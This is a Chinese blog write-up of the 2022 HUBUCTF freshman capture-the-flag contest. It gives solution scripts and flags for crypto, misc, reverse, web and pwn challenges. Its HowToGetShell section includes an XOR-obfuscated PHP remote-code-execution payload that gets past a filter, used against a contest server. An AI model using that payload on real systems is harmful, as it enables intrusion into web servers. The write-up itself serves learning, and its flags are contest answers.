---
title: 2022HUBUCTF
date: 2022-09-20 22:20:56
tags: 
       - 赛后复盘
       - CTF
categories: 
       - 赛后复盘
---

![QQ20220903-232916@2x](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182235929.png?x-oss-process=hzy)

<!--more-->

# 前言

湖北大学新生赛，过来水水了，nss？太难了，只能来打这个了

![image-20220918223700748](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182237832.png?x-oss-process=hzy)

# Checkin

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232663.png?x-oss-process=hzy)

构造true

```
<?php

$flag=array('username'=>true,'password'=>true);

echo serialize($flag);

?>
```

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232668.png?x-oss-process=hzy)

NSSCTF{9f0284b5-74d8-4b53-90fa-ec177bdc1b3f}

# ezPython

给了个pyc，用 uncompyle6反编译成py文件

[python反编译 - 在线工具 (tool.lu)](https://tool.lu/pyc/)

反编译结果如下

```
# uncompyle6 version 3.5.0

\# Python bytecode 3.7 (3394)

\# Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) 

\# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]

\# Embedded file name: .\ezPython.py

\# Size of source mod 2**32: 444 bytes

from Crypto.Util.number import *

import base64, base58

password = open('password.txt', 'r').read()

tmp = bytes_to_long(password.encode('utf-8'))

ans = base64.b64encode(base58.b58encode(str(tmp))).decode()

print("I've forgot my password,could you please help me find the password?")

if ans == 'M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==':

  print('You get the password!')

else:

print('Wrong! try again')
```

逆一下那个密文，base64，base58，hex转str

 

```
>>> s='HUBUCTF@1405'

\>>> md5(s).hexdigest()

'fd78ee3399dd6a3c1d0b637fdca0c075'
```

 

NSSCTF{ fd78ee3399dd6a3c1d0b637fdca0c075}

# 最简单的misc

Zsteg扫一下导出个二维码扫码得到flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232669.png?x-oss-process=hzy)

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232678.png?x-oss-process=hzy)

NSSCTF{01af2547082a7c800b20123f030b2a07}

 

# messy_traffic

pcap有个zip，提取出来，从http包看到zip的密码为SignUpForHUBUMars@1405,解压缩得到flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232683.png?x-oss-process=hzy)

NSSCTF{aacc4238460996f0178c18d7637c9dd5}

 

# RSAaaa

题目

```
就你小子是黑客？

我忘记怎么解密了！

靠你了，大黑阔！

 

(536970330703, 65537)

message: 473878130775 40132555282 40132555282 94619939727 72818765591 208015808884 42561234694 159353248388 27748063975 159353248388 159353248388 278953790403 410746718603 496849210942 27748063975 142521857906 103632267191 17774494147 328684046745 278953790403 129956887006 129956887006 366275425558 328684046745 142521857906 410746718603 142521857906 129956887006 379067009467 328684046745 159353248388 366275425558 129956887006 103632267191 27748063975 27748063975 17774494147 160623996897 278953790403 182341799525
```

解题思路

n=536970330703

e=65537

首先先是n分解p，q，计算素数

在新分解

[factordb.com](http://www.factordb.com/index.php?query=536970330703)

得到p=992623 q=540961

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232684.png?x-oss-process=hzy)

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232259.png?x-oss-process=hzy)

d=66284351873

知道p,q,e,s一把梭如下，对N进行分解（只要知道p和q,就能解出任何rsa）

```
s=[473878130775,40132555282,40132555282,94619939727,72818765591,208015808884,42561234694,159353248388,27748063975,159353248388,159353248388,278953790403,410746718603,496849210942,27748063975,142521857906,103632267191,17774494147,328684046745,278953790403,129956887006,129956887006,366275425558,328684046745,142521857906,410746718603,142521857906,129956887006,379067009467,328684046745,159353248388,366275425558,129956887006,103632267191,27748063975,27748063975,17774494147,160623996897,278953790403,182341799525]

\>>> e=65537

\>>> p=992623

\>>> q=540961

\>>> from gmpy2 import *

\>>> d = invert(e,(p-1)*(q-1))

\>>> flag=[]

\>>> for c in s:

  flag.append(pow(c,d,n))

 

\>>> for c in s:

  flag.append(pow(c,d,p*q))

\>>> ''.join(map(chr,flag))
```

 

NSSCTF{08004fa8571d4669d5f56ed096788134}

# base32

ocr转文字，这部分很麻烦，可以先找前半部分，提取正确出来之后发现是他们学校官网简介，然后只需要剩下的找不同即可，发现中间一段不一样，那就是flag

```
JB2WEZLJEBKW42LWMVZHG2LUPEWCA3DPMNQXIZLEEBUW4ICXOVUGC3RMEBRWC4DJORQWYIDDNF2HSIDPMYQEGZLOORZGC3BAINUGS3TBE5ZSASDVMJSWSICQOJXXM2LOMNSSYIDJOMQGCIDLMV4SAY3PNVYHEZLIMVXHG2LWMUQHK3TJOZSXE43JOR4SA2TPNFXHI3DZEBQWI3LJNZUXG5DFOJSWIIDCPEQEQ5LCMVUSAUDSN53GS3TDNFQWYICHN53GK4TONVSW45BAMFXGIICDNBUW4YJHOMQE22LONFZXI4TZEBXWMICFMR2WGYLUNFXW4LBAMNXXMZLSNFXGOIDBOJ2HGLBANBUXG5DPOJ4SYIDQNBUWY33TN5YGQ6JMEBZWG2LFNZRWKLBAMVXGO2LOMVSXE2LOM4WCAZLDN5XG63LJMNZSYIDMMF3SYIDNMFXGCZ3FNVSW45BMEBSWI5LDMF2GS33OFQQGCZ3SNFRXK3DUOVZGKIDBNZSCA3LFMRUWG2LOMUWCA53JORUCA5DIMUQGI2LTMNUXA3DJNZSXGIDPMYQE2YLUMVZGSYLMEBJWG2LFNZRWKIDBNZSCAQ3IMVWWS43UOJ4SA4TBNZVWS3THEB2G64BAGESSA2LOEB2GQZJAO5XXE3DEEBCVGSJOEBDGYYLHEBUXGIBOEBLWS5DIEBQSA2DJON2G64TZEBXWMIDFNFTWQ5DZFVZWK5TFNYQHSZLBOJZSYIDJOQQGC5DUOJQWG5DTEBWW64TFEB2GQYLOEAZDAMBQEBSGK5TPORSWIIDTORQWMZRANVSW2YTFOJZSYIBRGEYDAIDPMYQHO2DPNUQGC4TFEBTGCY3VNR2HSIDNMVWWEZLSOMQGM33SEB2GKYLDNBUW4ZZAMFXGIIDSMVZWKYLSMNUCYIDJNZRWY5LENFXGOIBSEBQWGYLEMVWWSY3JMFXHGIDPMYQHI2DFEBBWQ2LOMVZWKICBMNQWIZLNPEQG6ZRAKNRWSZLOMNSSYIBWG4YCA4DSN5TGK43TN5ZHGIDBNZSCAYLTONXWG2LBORSSA4DSN5TGK43TN5ZHGLRAJF2HGIDGOVWGYLLUNFWWKIDTOR2WIZLOOQQGK3TSN5WGY3LFNZ2CAYLNN52W45DTEB2G6IBSGUWDAMBQFQQGS3TDNR2WI2LOM4QDKLBUGAYCAZ3SMFSHKYLUMUQHG5DVMRSW45DTEBQW4ZBAMRXWG5DPOJQWYIDDMFXGI2LEMF2GK4ZO 

 

EBHFGU2DKRDHWMLCHE2DEOLCMUYDGMDFME2WEOLEMVTDEZJQGI4DMMDDGFRTKZRWPUXCASDVMJSWSICVNZUXMZLSONUXI6JA

 

NBQXGIDTMV2CA5LQEBQWGYLEMVWWSYZAMV4GG2DBNZTWKIDBNZSCAY3PN5YGK4TBORUW63RAOBZG6Z3SMFWXGIDXNF2GQIDBMJXXK5BAGE2TAIDVNZUXMZLSONUXI2LFOMQGC3TEEBZGK43FMFZGG2BANFXHG5DJOR2XIZLTEBUW4IBTGUQGG33VNZ2HE2LFOMQGC3TEEBZGKZ3JN5XHGLRAJF2CA2DBOMQGG3ZNMVZXIYLCNRUXG2DFMQQHI2DSMVSSAQ3PNZTHKY3JOVZSASLOON2GS5DVORSXGIDXNF2GQIDUNBSSAVLONF3GK4TTNF2HSIDPMYQE2ZLNOBUGS4ZANFXCA5DIMUQFKU2BFQQFGYLPEBIGC5LMN4QFG5DBORSSAVLONF3GK4TTNF2HSIDJNYQEE4TBPJUWYLBAKVXGS5TFOJZWS5DZEBXWMICTMFXSAVDPNVSSAYLOMQQFA4TJNZRWS4DFEBZGK43QMVRXI2LWMVWHSLBAMFXGIIDPNZSSAQ3PNZTHKY3JOVZSAQ3MMFZXG4TPN5WSA53JORUCASTBM5UWK3DMN5XGSYLOEBBW63DMMVTWKIDJNYQFA33MMFXGILRAJFXGC5LHOVZGC5DFMQQGS3RAGIYDAOBMEB2GQZJAINXW4ZTVMNUXK4ZAJFXHG5DJOR2XIZJAMF2CAU3BN4QFAYLVNRXSAU3UMF2GKICVNZUXMZLSONUXI6JAFBKW4ZLTOAQEGSJJEBUXGIDUNBSSAZTJOJZXIICDN5XGM5LDNF2XGICJNZZXI2LUOV2GKIDJNYQEE4TBPJUWYLRAJF2CA2DBOMQHO33OEB2GQZJAE5BW63TGOVRWS5LTEBEW443UNF2HK5DFEBXWMIDUNBSSAWLFMFZCOICBO5QXEZBAORUHEZLFEB2GS3LFOMQCQMRQGEYCYIBSGAYTELBAGIYDCNRJEBQW4ZBAMJSWGYLNMUQG63TFEBXWMIDUNBSSAMJTE5IGS3DPOQQEG5LMOR2XEYLMEBBW63TGOVRWS5LTEBEW443UNF2HK5DFOMTSA2LOEAZDAMJWFYQES5BANFZSA3TPO4QHI2DFEBWGC4THMVZXIICDN5XGM5LDNF2XGICJNZZXI2LUOV2GKIDJNYQEE4TBPJUWYLRAIJQXGZLEEBXW4IDUNBUXGIDQNRQXIZTPOJWSYICIOVRGK2JAKVXGS5TFOJZWS5DZEBQW4ZBAKNQW6ICQMF2WY3ZAKN2GC5DFEBKW42LWMVZHG2LUPEQGQYLWMUQGIZLWMVWG64DFMQQGI2LWMVZHGZJAMNXWY3DBMJXXEYLUNFXW4IDTOVRWQIDBOMQHG5DBMZT CAYLOMQQHG5DVMRSW45BAMV4GG2DBNZTWKIDBOMQHOZLMNQQGC4ZAOJSXGZLBOJRWQIDDN5XXAZLSMF2GS33OFY======

 
```

NSSCTF{1b9429be030ea5b9def2e02860c1c5f6}

# HowToGetShell

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232268.png?x-oss-process=hzy)

无参RCE，异或绕过，老题目了

https://blog.51cto.com/u_15057851/4220892

```
传参mess=$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);&_=phpinfo();
```

得到flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232269.png?x-oss-process=hzy)

NSSCTF{22607883-ed46-416f-a615-8bf8235c39fa}

# Calculate

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232351.png?x-oss-process=hzy)

二十个题目，每次要在三秒之内写出来，也不能小于一秒，全打出来就对了

脚本如下

```
import requests

import re

import time

url = 'http://1.14.71.254:28330/'

s = requests.session()

for i in range(0,20):

  a = s.get(url)

  print(a.text)

  r2 = re.findall(r".</div>", a.text)

  l = (len(r2))

  str = ""

  for i in range(0, l - 1):

​    str = r2[i] + str

  r3 = re.sub('</div>', '', str)

  r4 = r3[::-1]

  num = eval(r4)

  data = {'ans': num}

  time.sleep(0.5)

  flag = s.post(url=url, data=data)

 

print(flag.text)
```

NSSCTF{aca10207-affa-4d0c-ac30-521116667244}

# simple_RE

base64换码表

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232353.png?x-oss-process=hzy)

跟进

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232352.png?x-oss-process=hzy)

5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232772.png?x-oss-process=hzy)

脚本如下

```
import base64

table="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="

table_changed="qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD="

s='5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8=='

res=""

for c in s:

  res+=table[table_changed.find(c)]   

print(base64.b64decode(res))
```

 

NSSCTF{a8d4347722800e72e34e1aba3fe914ae}

# Hep

Exp

```
from hashlib import *

s='wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd'

 

a=md5(s.encode("utf-8")).hexdigest()

print(a)

\#'a8622109e2fb1296e06d5eed6f78f954'
```

 

NSSCTF{ a8622109e2fb1296e06d5eed6f78f954}

# Ezsql

Dirsearch扫目录，源码泄露/www.tar.gz，未解决

# Anger？Angr

构造exp求angr

```
#!/usr/bin/env python3

 

import angr

import claripy

import time

 

p = angr.Project('./anger',auto_load_libs=False)

state = p.factory.entry_state() 

 

sm  = p.factory.simgr(state)

 

r= sm.explore(find=0x401734,avoid =0x4017c3)

 

print (r.found[0].posix.dumps(0))

\#b't\xdaR\xbc\x7f\x01~Nf]\x04H\x01QY^ hgDCZ{g*XJE!\xbeQ%'

 

打远程，exp如下

from pwn import *

 

exp = b't\xdaR\xbc\x7f\x01~Nf]\x04H\x01QY^ hgDCZ{g*XJE!\xbeQ%'

 

io = remote('1.14.71.254',28118)

io.recv()

io.sendline(exp)

io.interactive()
```

 

 

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232825.png?x-oss-process=hzy)

NSSCTF{4f87757b-3e4a-4e51-9a97-0fa4b94a9c6e}